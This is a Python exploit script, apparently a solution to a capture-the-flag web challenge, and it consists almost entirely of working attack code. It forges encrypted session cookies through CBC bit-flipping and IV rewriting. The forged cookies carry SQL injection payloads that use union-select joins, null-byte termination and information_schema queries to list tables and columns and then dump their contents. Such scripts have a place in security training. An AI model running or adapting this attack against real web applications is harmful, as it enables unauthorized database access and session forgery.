#!/usr/bin/env python3
from base64 import *
import urllib.parse
import requests
import re


def login(payload, idx, c1, c2):
    url = r'http://ctf5.shiyanbar.com/web/jiandan/index.php'
    payload = {'id': payload}
    r = requests.post(url, data=payload)
    Set_Cookie = r.headers['Set-Cookie']
    iv = re.findall(r"iv=(.*?),", Set_Cookie)[0]
    cipher = re.findall(r"cipher=(.*)", Set_Cookie)[0]
    iv_raw = b64decode(urllib.parse.unquote(iv))
    cipher_raw = b64decode(urllib.parse.unquote(cipher))
    lst = list(cipher_raw)
    lst[idx] = lst[idx] ^ ord(c1) ^ ord(c2)  # 对单个字节进行翻转
    cipher_new = bytes(lst)
    cipher_new = urllib.parse.quote(b64encode(cipher_new))
    cookie_new = {'iv': iv, 'cipher': cipher_new}
    r = requests.post(url, cookies=cookie_new)
    plain = re.findall(r"base64_decode\('(.*?)'\)", r.text)[0]
    plain = b64decode(plain)
    first = 'a:1:{s:2:"id";s:'
    iv_new = []
    for i in range(16):        # 重写init vector,保证前16字节的正确解码
        iv_new.append(ord(first[i]) ^ plain[i] ^ iv_raw[i])
    iv_new = bytes(iv_new)
    iv_new = urllib.parse.quote(b64encode(iv_new))
    cookie_new = {'iv': iv_new, 'cipher': cipher_new}
    r = requests.post(url, cookies=cookie_new)
    text = r.text
    print(text)


if __name__ == '__main__':
    login('12', 4, '2', '#')
    login('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);' + chr(0), 6, '2', 'u')
    login(
        '0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);' + chr(
            0), 7, '2', 'u')
    login(
        "0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);" + chr(
            0), 7, '2', 'u')
    login("0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);" + chr(0), 6, '2', 'u')
